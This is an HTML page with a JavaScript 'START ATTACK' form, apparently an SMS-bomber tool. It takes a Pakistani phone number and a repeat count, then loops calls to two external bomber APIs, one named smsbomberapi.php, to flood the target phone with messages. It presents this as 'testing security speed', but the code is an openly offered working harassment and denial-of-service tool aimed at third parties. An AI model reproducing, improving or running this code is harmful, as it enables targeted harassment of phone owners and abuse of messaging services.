<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>HACKER - QADEER</title>
  <style>
    body {
      margin: 0;
      font-family: 'Courier New', monospace;
      background: white; /* Background white kar diya hai */
      color: #333; /* Text color dark kar diya hai takay white background par nazar aye */
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
      height: 100vh;
    }

    /* Baaqi styles wesay hi hain */
    nav {
      width: 100%;
      background: rgba(0, 255, 136, 0.12);
      backdrop-filter: blur(10px);
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 12px 30px;
      box-shadow: 0 0 20px rgba(0, 255, 136, 0.5);
    }

    nav h1 {
      font-size: 22px;
      color: #00ff88;
      text-shadow: 0 0 10px #00ff88;
    }

    nav ul {
      list-style: none;
      display: flex;
      gap: 25px;
    }

    nav ul li a {
      cursor: pointer;
      font-size: 16px;
      color: #ff00ff;
      text-decoration: none;
      transition: color 0.3s, text-shadow 0.3s;
    }

    nav ul li a:hover {
      color: #00ffff;
      text-shadow: 0 0 10px #00ffff;
    }

    .card {
      margin-top: 60px;
      background: rgba(0,0,0,0.08); /* Card ka background thora dark kar diya takay white par nazar aye */
      backdrop-filter: blur(12px);
      padding: 30px;
      border-radius: 20px;
      box-shadow: 0 0 40px rgba(255,0,255,0.4);
      width: 350px;
      text-align: center;
      animation: fadeIn 1.2s ease;
    }

    .card h2 {
      margin-bottom: 20px;
      color: #00ffff;
      text-shadow: 0 0 12px #00ffff;
    }

    input {
      width: 90%;
      margin: 12px 0;
      padding: 12px;
      border: none;
      border-radius: 12px;
      background: rgba(0,0,0,0.7);
      color: #fff;
      font-size: 16px;
      box-shadow: 0 0 10px rgba(0,255,136,0.5);
      outline: none;
    }

    button {
      margin-top: 18px;
      width: 95%;
      padding: 14px;
      border: none;
      border-radius: 12px;
      background: linear-gradient(45deg, #ff00ff, #00ffff);
      color: #000;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      transition: transform 0.2s, box-shadow 0.2s;
      box-shadow: 0 0 20px #ff00ff;
    }

    button:hover {
      transform: scale(1.05);
      box-shadow: 0 0 25px #00ffff;
    }

    #status {
      margin-top: 20px;
      padding: 12px;
      border-radius: 10px;
      background: rgba(0,0,0,0.5);
      min-height: 40px;
      max-height: 150px;
      overflow-y: auto;
      font-size: 14px;
      white-space: pre-line;
      color: #ff00ff;
      text-align: left;
    }

    @keyframes fadeIn {
      from {opacity: 0; transform: translateY(-20px);}
      to {opacity: 1; transform: translateY(0);}
    }
  </style>
</head>
<body>
  <nav>
    <h1>QADEER</h1>
    <ul>
      <li><a href="https://wa.me/923151105391" target="_blank">Contact</a></li>
    </ul>
  </nav>

  <div class="card">
    <h2>🚀 TESTING SECURITY SPEED 🚀</h2>
    <input type="text" id="number" placeholder="315xxxxxxx">
    <input type="number" id="amount" placeholder="Enter Amount">
    <button onclick="startAttack()">START ATTACK</button>
    <div id="status">Status: Waiting...</div>
  </div>

  <script>
    async function startAttack() {
      const number = document.getElementById("number").value.trim();
      const amount = parseInt(document.getElementById("amount").value.trim()) || 1;
      const statusBox = document.getElementById("status");

      if (!number || number.length < 10) {
        statusBox.textContent = "⚠️ Please enter a valid 10-digit number!";
        return;
      }

      statusBox.textContent = "🚀 Launching...";
      
      for (let i = 1; i <= amount; i++) {
        const url1 = `https://famofcfallxd.serv00.net/apis/api.php?number=92${number}&amount=1`;
        const url2 = `https://shadowscriptz.xyz/public_apis/smsbomberapi.php?num=92${number}`;
        
        try {
          await Promise.all([
            fetch(url1),
            fetch(url2)
          ]);
          statusBox.textContent += `\n[${i}] ✅ APIs Called | QADEER`;
        } catch (err) {
          statusBox.textContent += `\n[${i}] ❌ Error | QADEER`;
          console.error(err);
        }
        statusBox.scrollTop = statusBox.scrollHeight;
      }
      statusBox.textContent += `\n\n🎉 Attack Finished!`;
      statusBox.scrollTop = statusBox.scrollHeight;
    }
  </script>
</body>
</html>
